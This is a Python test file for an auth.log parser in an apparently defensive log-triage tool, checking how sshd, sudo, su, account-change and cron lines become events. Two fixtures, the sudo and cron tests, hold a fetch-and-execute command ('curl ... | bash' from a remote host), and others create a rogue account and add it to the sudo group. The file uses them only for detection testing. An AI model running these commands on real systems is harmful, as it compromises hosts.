"""Parser tests.

Every string here is a line a real Debian/Ubuntu host writes. The parser is the
only thing standing between a log and a detection, so it gets the most tests:
a misread line is a missed intrusion, and a silently dropped line is worse,
because the report then says nothing happened.
"""

import datetime

from _util import YEAR, line, parse_log, parse_one

from logtriage import models
from logtriage.parser import AuthLogParser, parse_lines


def test_failed_password_for_known_user():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Failed password for deploy "
                      "from 203.0.113.7 port 51422 ssh2")
    assert event.kind == models.SSH_FAILED_PASSWORD
    assert event.user == "deploy"
    assert event.source_ip == "203.0.113.7"
    assert event.source_port == 51422
    assert event.auth_method == "password"
    assert event.invalid_user is False


def test_failed_password_for_invalid_user_is_flagged():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Failed password for invalid user "
                      "admin from 203.0.113.7 port 51422 ssh2")
    assert event.kind == models.SSH_FAILED_PASSWORD
    assert event.user == "admin"
    assert event.invalid_user is True


def test_failed_publickey_counts_as_a_failure():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Failed publickey for root "
                      "from 203.0.113.7 port 51422 ssh2")
    assert event.kind == models.SSH_FAILED_PASSWORD
    assert event.user == "root"


def test_accepted_password_sets_authentication_method():
    event = parse_one("Sep 21 18:52:20 web01 sshd[12345]: Accepted password for deploy "
                      "from 198.51.100.4 port 51430 ssh2")
    assert event.kind == models.SSH_ACCEPTED_PASSWORD
    assert event.auth_method == "password"
    assert event.source_ip == "198.51.100.4"


def test_accepted_publickey_keeps_the_key_description():
    event = parse_one("Sep 21 18:52:20 web01 sshd[12345]: Accepted publickey for deploy "
                      "from 198.51.100.4 port 51430 ssh2: RSA SHA256:abc123")
    assert event.kind == models.SSH_ACCEPTED_PUBKEY
    assert event.auth_method == "publickey"
    assert event.command == "RSA SHA256:abc123"


def test_invalid_user_line():
    event = parse_one("Sep 21 18:52:13 web01 sshd[12345]: Invalid user admin "
                      "from 203.0.113.7 port 51422")
    assert event.kind == models.SSH_INVALID_USER
    assert event.invalid_user is True
    assert event.user == "admin"


def test_maximum_attempts_exceeded():
    event = parse_one("Sep 21 19:06:12 web01 sshd[12345]: error: maximum authentication "
                      "attempts exceeded for root from 203.0.113.7 port 51510 ssh2 [preauth]")
    assert event.kind == models.SSH_MAX_ATTEMPTS
    assert event.user == "root"
    assert event.source_port == 51510


def test_connection_closed_by_authenticating_user():
    event = parse_one("Sep 21 19:08:00 web01 sshd[12345]: Connection closed by authenticating "
                      "user deploy 203.0.113.7 port 51520 [preauth]")
    assert event.kind == models.SSH_DISCONNECT
    assert event.user == "deploy"


def test_disconnect_without_user_field_still_parses():
    event = parse_one("Sep 21 19:07:00 web01 sshd[12345]: Received disconnect from "
                      "203.0.113.7 port 51510:11: Bye Bye [preauth]")
    assert event.kind == models.SSH_DISCONNECT
    assert event.user == ""
    assert event.source_ip == "203.0.113.7"


def test_sshd_session_open_names_the_target_account():
    event = parse_one("Sep 21 18:52:20 web01 sshd[12345]: pam_unix(sshd:session): "
                      "session opened for user deploy by (uid=0)")
    assert event.kind == models.SSH_SESSION_OPEN
    assert event.target == "deploy"
    assert event.user == ""


def test_session_new_from_logind():
    event = parse_one("Sep 21 18:52:21 web01 systemd-logind[901]: New session 42 of user deploy.")
    assert event.kind == models.SESSION_NEW
    assert event.user == "deploy"


def test_sudo_command_extracts_user_target_and_command():
    event = parse_one("Sep 21 18:52:40 web01 sudo[12345]:   deploy : TTY=pts/0 ; "
                      "PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get update")
    assert event.kind == models.SUDO_COMMAND
    assert event.user == "deploy"
    assert event.target == "root"
    assert event.command == "/usr/bin/apt-get update"
    assert event.tty == "pts/0"


def test_sudo_command_keeps_pipes_and_quotes_intact():
    event = parse_one(
        "Sep 21 18:52:40 web01 sudo[12345]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; "
        "USER=root ; COMMAND=/bin/bash -c 'curl -s http://198.51.100.9/x.sh | bash'"
    )
    assert event.command == "/bin/bash -c 'curl -s http://198.51.100.9/x.sh | bash'"


def test_sudo_incorrect_password_attempt():
    event = parse_one("Sep 21 18:53:01 web01 sudo[12345]:   deploy : 2 incorrect password "
                      "attempt ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
    assert event.kind == models.SUDO_AUTH_FAILURE
    assert event.user == "deploy"
    assert event.target == "root"


def test_pam_authentication_failure_is_context_not_a_rate_event():
    event = parse_one("Sep 21 18:53:01 web01 sudo[12345]: pam_unix(sudo:auth): authentication "
                      "failure; logname= uid=0 euid=0 tty=/dev/pts/0 ruser=deploy rhost=  "
                      "user=deploy")
    assert event.kind == models.AUTH_FAILURE
    assert event.user == "deploy"
    assert event.target == "deploy"


def test_failed_su_is_recorded_with_both_names():
    event = parse_one("Sep 21 18:53:01 web01 su[2050]: FAILED su for root by deploy")
    assert event.kind == models.SUDO_AUTH_FAILURE
    assert event.user == "deploy"
    assert event.target == "root"


def test_su_session_opened_for_root():
    event = parse_one("Sep 21 18:53:30 web01 su[2050]: pam_unix(su:session): session opened "
                      "for user root(uid=0) by deploy(uid=1000)")
    assert event.kind == models.SU_SESSION_OPEN
    assert event.target == "root"
    assert event.user == "deploy"


def test_useradd_new_user():
    event = parse_one("Sep 21 19:01:02 web01 useradd[3311]: new user: name=mallory, UID=1002, "
                      "GID=1002, home=/home/mallory, shell=/bin/bash, from=/dev/pts/0")
    assert event.kind == models.USER_ADD
    assert event.user == "mallory"
    assert "uid=1002" in event.command
    assert "shell=/bin/bash" in event.command


def test_usermod_group_membership():
    event = parse_one("Sep 21 19:02:11 web01 usermod[3320]: add 'mallory' to group 'sudo'")
    assert event.kind == models.USER_MODIFY
    assert event.user == "mallory"
    assert event.target == "sudo"


def test_password_change():
    event = parse_one("Sep 21 19:02:44 web01 passwd[3399]: pam_unix(passwd:chauthtok): "
                      "password changed for mallory")
    assert event.kind == models.PASSWORD_CHANGE
    assert event.user == "mallory"


def test_cron_command():
    event = parse_one("Sep 21 19:05:00 web01 CRON[4400]: (root) CMD "
                      "(curl -s http://198.51.100.9/x.sh | bash)")
    assert event.kind == models.CRON_COMMAND
    assert event.user == "root"
    assert event.command == "curl -s http://198.51.100.9/x.sh | bash"


def test_iso_timestamp_with_offset():
    event = parse_one("2026-09-21T18:52:11.423891+02:00 web01 sshd[12345]: Failed password for "
                      "deploy from 203.0.113.7 port 51422 ssh2")
    assert event.ts == datetime.datetime(2026, 9, 21, 18, 52, 11, 423891)
    assert event.kind == models.SSH_FAILED_PASSWORD


def test_iso_timestamp_with_zulu_suffix():
    event = parse_one("2026-09-21T16:52:11Z web01 sshd[12345]: Failed password for deploy "
                      "from 203.0.113.7 port 51422 ssh2")
    assert event.ts == datetime.datetime(2026, 9, 21, 16, 52, 11)


def test_fractional_seconds_are_kept():
    event = parse_one("Sep 21 18:52:11.123456 web01 sshd[12345]: Invalid user admin "
                      "from 203.0.113.7 port 51422")
    assert event.ts.microsecond == 123456


def test_host_and_process_and_pid_are_captured():
    event = parse_one("Sep 21 18:52:11 db02 sshd[987]: Accepted password for deploy "
                      "from 198.51.100.4 port 51430 ssh2")
    assert event.host == "db02"
    assert event.process == "sshd"
    assert event.pid == 987


def test_raw_line_and_line_number_are_kept():
    text = "Sep 21 18:52:11 web01 sshd[12345]: Invalid user admin from 203.0.113.7 port 51422"
    event = parse_one(text)
    assert event.raw == text
    assert event.line_no == 1
    assert parse_log("\n" + text)[0].line_no == 2


def test_year_defaults_to_the_current_year():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Invalid user admin from 1.2.3.4 port 1")
    assert event.ts.year == datetime.date.today().year


def test_year_can_be_pinned_for_old_logs():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Invalid user admin from 1.2.3.4 port 1",
                      year=2024)
    assert event.ts.year == 2024


def test_year_rolls_over_when_the_log_crosses_new_year():
    parser = AuthLogParser(year=2025)
    december = parser.parse_line(
        "Dec 31 23:59:58 web01 sshd[1]: Invalid user admin from 1.2.3.4 port 1", line_no=1
    )
    january = parser.parse_line(
        "Jan  1 00:00:04 web01 sshd[1]: Accepted password for deploy from 1.2.3.4 port 2 ssh2",
        line_no=2,
    )
    assert december.ts.year == 2025
    assert december.ts.month == 12
    assert january.ts.year == 2026
    assert january.ts.month == 1


def test_rollover_does_not_fire_on_a_normal_month_change():
    parser = AuthLogParser(year=2026)
    parser.parse_line("Sep 30 23:00:00 web01 sshd[1]: Invalid user admin from 1.2.3.4 port 1")
    october = parser.parse_line(
        "Oct  1 00:10:00 web01 sshd[1]: Invalid user admin from 1.2.3.4 port 1"
    )
    assert october.ts.year == 2026


def test_blank_line_produces_no_event():
    assert AuthLogParser().parse_line("   \n") is None


def test_unrecognised_line_is_kept_as_other():
    event = parse_one("Sep 21 18:52:11 web01 kernel[0]: usb 1-1: new high-speed USB device")
    assert event.kind == models.OTHER
    assert "USB device" in event.message


def test_body_without_a_syslog_header_is_still_inspected():
    # Some appliances and `journalctl -o cat` output ship the message alone.
    events = parse_lines(iter([
        "Failed password for root from 203.0.113.7 port 51422 ssh2\n",
    ]))
    assert len(events) == 1
    assert events[0].kind == models.SSH_FAILED_PASSWORD
    assert events[0].ts is None


def test_another_daemon_cannot_impersonate_sshd():
    event = parse_one("Sep 21 18:52:11 web01 myapp[42]: Failed password for deploy from "
                      "203.0.113.7 port 51422 ssh2")
    assert event.kind == models.OTHER


def test_ipv6_source_address():
    event = parse_one("Sep 21 18:52:11 web01 sshd[12345]: Failed password for deploy from "
                      "2001:db8::1 port 51422 ssh2")
    assert event.source_ip == "2001:db8::1"


def test_lines_feed_the_parser_in_order():
    lines = [
        line("Invalid user admin from 203.0.113.7 port 1", offset_seconds=0),
        line("Accepted password for deploy from 203.0.113.7 port 2 ssh2", offset_seconds=30),
    ]
    events = parse_log("\n".join(lines))
    assert [e.kind for e in events] == [
        models.SSH_INVALID_USER,
        models.SSH_ACCEPTED_PASSWORD,
    ]
    assert events[1].ts > events[0].ts
    assert events[1].ts.year == YEAR
